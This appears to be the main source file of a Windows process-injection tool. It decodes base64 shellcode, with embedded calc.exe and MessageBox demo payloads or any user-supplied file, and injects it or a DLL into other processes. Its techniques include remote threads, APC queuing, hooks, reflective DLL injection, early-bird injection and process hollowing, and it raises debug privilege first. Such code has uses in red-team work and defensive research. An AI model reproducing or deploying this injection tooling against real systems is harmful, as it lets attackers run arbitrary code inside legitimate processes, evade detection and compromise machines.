#include <fstream>
#include <string.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <WinCrypt.h>

#include "fheaders.h"
#include "auxiliary.h"

#pragma comment(lib,"Crypt32.lib")

DWORD wmain(int argc, wchar_t* argv[])
{
	PCWSTR pszLibFile = NULL;
	wchar_t *strProcName;
	DWORD dwProcessId = 0;
	DWORD dwTechnique = 0;
	DWORD v = checkOS();

	PBYTE pShellcode = NULL;
	DWORD dwShellcodeLength = 0;

	PCWSTR start_process = NULL;
	PCWSTR replacement_process = NULL;

	if (argc != 4 && argc != 6 && argc != 5)
	{
		displayHelp();
		return 0;
	}

	// shellcode
	char *sc = NULL;
	std::string shellcode = "";

	if (_wcsicmp(argv[3], TEXT("-i")) == 0)
	{
		if ((_wcsicmp(argv[2], TEXT("100")) == 0) ||
			(_wcsicmp(argv[2], TEXT("200")) == 0) ||
			(_wcsicmp(argv[2], TEXT("300")) == 0) ||
			(_wcsicmp(argv[2], TEXT("400")) == 0) ||
			(_wcsicmp(argv[2], TEXT("500")) == 0) ||
			(_wcsicmp(argv[2], TEXT("600")) == 0) ||
			(_wcsicmp(argv[2], TEXT("700")) == 0) ||
			(_wcsicmp(argv[2], TEXT("701")) == 0) ||
			(_wcsicmp(argv[2], TEXT("2000")) == 0)
			)
		{
			wprintf(TEXT("Setting DLL...\n"));
			pszLibFile = (wchar_t *)malloc((wcslen(argv[4]) + 1) * sizeof(wchar_t));
			pszLibFile = argv[4];
		}
		else if ( (_wcsicmp(argv[2], TEXT("1601")) == 0))
		{
			wprintf(TEXT("Setting Shellcode (sRDI)...\n"));
			pszLibFile = (wchar_t *)malloc((wcslen(argv[4]) + 1) * sizeof(wchar_t));
			pszLibFile = argv[4];
		}
		else if ( (_wcsicmp(argv[2], TEXT("1600")) == 0) )
		{
			// process replacement
			start_process = (wchar_t *)malloc((wcslen(argv[5]) + 1) * sizeof(wchar_t));
			start_process = argv[5];

			replacement_process = (wchar_t *)malloc((wcslen(argv[4]) + 1) * sizeof(wchar_t));
			replacement_process = argv[4];
		}
		else
		{
			// TODO - update with Base64 shellcode if desired. exitfunc=process
			std::string calc_x86 = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNtZCAvYyBjYWxjAA==";
			std::string calc_x64 = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kIC9jIGNhbGMA";
			std::string msgbox_x86 = "2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hveFggaGFnZUJoTWVzczHbiFwkConjaHJsZFhobyB3b2hoZWxsMcmITCQLieEx0lJTUVL/0DHAUP9VCA==";
			std::string msgbox_x64 = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZX+AAAAPkyNhQ8BAABIMclBukWDVgf/1UgxyUG68LWiVv/VSGVsbG8sIGZyb20gTVNGIQBNZXNzYWdlQm94AA==";

			// ThreadExecutionHijack - demoShellcodeSuspendInjectResume
			if ((_wcsicmp(argv[2], TEXT("1300")) == 0))
			{
				// execfunc=thread
				calc_x86 = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";
				calc_x64 = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
				msgbox_x86 = "2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu+/O4GCHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hveFggaGFnZUJoTWVzczHbiFwkConjaHJsZFhobyB3b2hoZWxsMcmITCQLieEx0lJTUVL/0DHAUP9VCA==";
				msgbox_x64 = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZUaAQAAPkyNhSYBAABIMclBukWDVgf/1bvgHSoKQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1WhlbGxvIHdvcmxkAE1lc3NhZ2VCb3gA";
			}

			if (_wcsicmp(argv[4], TEXT("1")) == 0)
			{
				wprintf(TEXT("Using calc x86 shellcode...\n"));
				shellcode = calc_x86;
			}
			else if (_wcsicmp(argv[4], TEXT("2")) == 0)
			{
				wprintf(TEXT("Using calc x64 shellcode...\n"));
				shellcode = calc_x64;
			}
			else if (_wcsicmp(argv[4], TEXT("3")) == 0)
			{
				wprintf(TEXT("Using msgbox x86 shellcode...\n"));
				shellcode = msgbox_x86;
			}
			else if (_wcsicmp(argv[4], TEXT("4")) == 0)
			{
				wprintf(TEXT("Using msgbox x64 shellcode...\n"));
				shellcode = msgbox_x64;
			}
			else
			{
				std::ifstream ifs(argv[4]);
				std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
				shellcode = content;
			}
			sc = (char*)shellcode.c_str();

			if (!CryptStringToBinaryA(sc, 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL))
			{
				wprintf(TEXT("Failed to decode the provided shellcode\n"));
				return 0;
			}
			pShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwShellcodeLength);
			if (pShellcode == NULL)
			{
				wprintf(TEXT("Failed to allocate space for the shellcode\n"));
				return 0;
			}
			if (!CryptStringToBinaryA(sc, 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL))
			{
				wprintf(TEXT("Failed to decode the provided shellcode\n"));
				return 0;
			}
		}
	}

	if (_wcsicmp(argv[1], TEXT("-m")) == 0)
	{

		if (	(_wcsicmp(argv[2], TEXT("1500")) == 0) ||
				(_wcsicmp(argv[2], TEXT("1600")) == 0)
			)
		{
			start_process = (wchar_t *)malloc((wcslen(argv[5]) + 1) * sizeof(wchar_t));
			start_process = argv[5];
		}
		else if (	(_wcsicmp(argv[2], TEXT("701")) == 0) ||
					(_wcsicmp(argv[2], TEXT("1601")) == 0)
			)
		{
			// dont use the process ID
		}
		else
		{
			if ((_wcsicmp(argv[2], TEXT("1700")) == 0))
			{
				//PE Injection
				strProcName = (wchar_t *)malloc((wcslen(argv[3]) + 1) * sizeof(wchar_t));
				strProcName = argv[3];
			}
			else 
			{
				if (argc != 6)
				{
					displayHelp();
					return 0;
				}
				strProcName = (wchar_t *)malloc((wcslen(argv[5]) + 1) * sizeof(wchar_t));
				strProcName = argv[5];
			}

			dwProcessId = findPidByName(strProcName);
			if (dwProcessId == 0)
			{
				wprintf(TEXT("[-] Error: Could not find PID (%d).\n"), dwProcessId);
				return 1;
			}
		}
		SetSePrivilege();

		wprintf(TEXT("Executing...\n"));

		switch (_wtoi(argv[2]))
		{
			case 100:
				demoCreateRemoteThreadW(pszLibFile, dwProcessId);
				break;
			case 200:
				demoNtCreateThreadEx(pszLibFile, dwProcessId);
				break;
			case 300:
				demoQueueUserAPC(pszLibFile, dwProcessId);
				break;
			case 400:
				demoSetWindowsHookEx(pszLibFile, dwProcessId, strProcName);
				break;
			case 500:
				demoRtlCreateUserThread(pszLibFile, dwProcessId);
				break;
			case 600:
#ifdef _WIN64
				demoSuspendInjectResume64(pszLibFile, dwProcessId);
#else
				demoSuspendInjectResume(pszLibFile, dwProcessId);
#endif
				break;
			case 700:
				demoReflectiveDllInjection(pszLibFile, dwProcessId);
				break;
			case 701:
				if (argc == 6)
					wprintf(TEXT("Process not used for sRDI. \n"));

				demoSRDI(pszLibFile);
				break;
			case 800:
				demoShellcodeCreateRemoteThreadW(pShellcode, dwShellcodeLength, dwProcessId);
				break;
			case 900:
				wprintf(TEXT("Not supported\n"));
				//demoShellcodeNtCreateThreadEx(pShellcode, dwShellcodeLength, dwProcessId);
				break;
			case 1000:
				demoShellcodeQueueUserAPC(pShellcode, dwShellcodeLength, dwProcessId);
				break;
			case 1100:
				wprintf(TEXT("Not supported\n"));
				//demoSetWindowsHookEx(pszLibFile, dwProcessId, strProcName);
				break;
			case 1200:
				demoShellcodeRtlCreateUserThread(pShellcode, dwShellcodeLength, dwProcessId);
				break;
			case 1300:
				// x86 works, x64 doesnt.
				wprintf(TEXT("Not supported\n"));
				//demoShellcodeSuspendInjectResume(pShellcode, dwShellcodeLength, dwProcessId);
				break;
			case 1500:
				// vulcan_x64.exe -m 1500 -i 2 "C:\Windows\system32\notepad.exe"
				demoShellcodeEarlyBird(start_process, pShellcode, dwShellcodeLength);
				break;
			case 1600:
				//vulcan_x64.exe -m 1600 -i "C:\\windows\\system32\\calc.exe" "C:\Windows\system32\notepad.exe"
				demoNtUnmapViewOfSection(start_process, replacement_process);
				break;
			case 1700:
				wprintf(TEXT("Not supported\n"));
				//demoInjectPE(dwProcessId);
				break;
			case 2000:
				// vulcan_x64.exe -m 2000 -i "Hello C# from C++!" notepad.exe
				demoCLR(pszLibFile,dwProcessId);
				break;
			default:
				displayHelp();
		}
	}
	else
		displayHelp();

	return 0;
}
